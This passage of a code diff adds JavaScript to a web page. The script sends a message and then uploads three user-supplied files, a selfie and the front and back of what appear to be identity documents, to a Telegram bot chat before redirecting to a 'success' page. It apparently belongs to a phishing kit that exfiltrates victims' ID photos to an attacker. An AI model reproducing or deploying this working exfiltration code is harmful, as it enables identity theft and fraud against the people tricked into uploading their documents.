+let textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+$.post(textUrl, { chat_id: chatId, text: message }, function () {
+    console.log("Message sent successfully");
+});
+
+// Function to send files and track completion
+let filesToSend = ["selfie", "file_upload_front", "file_upload_back"];
+let filesUploaded = 0;
+
+function sendFile(fileInputName) {
+    let file = document.getElementById(fileInputName)?.files[0];
+    if (file) {
+        let fileData = new FormData();
+        fileData.append("chat_id", chatId);
+        fileData.append("document", file, file.name);
+
+        let fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+        $.ajax({
+            url: fileUrl,
+            type: "POST",
+            data: fileData,
+            processData: false,
+            contentType: false,
+            success: function(response) {
+                console.log(`File ${fileInputName} sent successfully:`, response);
+                checkAllFilesUploaded();
+            },
+            error: function(xhr, status, error) {
+                console.error(`Error sending file ${fileInputName}:`, error);
+                checkAllFilesUploaded();
+            }
+        });
+    } else {
+        console.warn(`No file found with input name: ${fileInputName}`);
+        checkAllFilesUploaded();
+    }
+}
+
+// Function to check if all files are uploaded before redirecting
+function checkAllFilesUploaded() {
+    filesUploaded++;
+    if (filesUploaded === filesToSend.length) {
+        console.log("All files uploaded. Redirecting...");
+        window.location.href = './success.html';
+    }
+}
+
+// Send all files
+filesToSend.forEach(sendFile);
+
+        });
+    </script>
+
+    
+</body>
+</html>
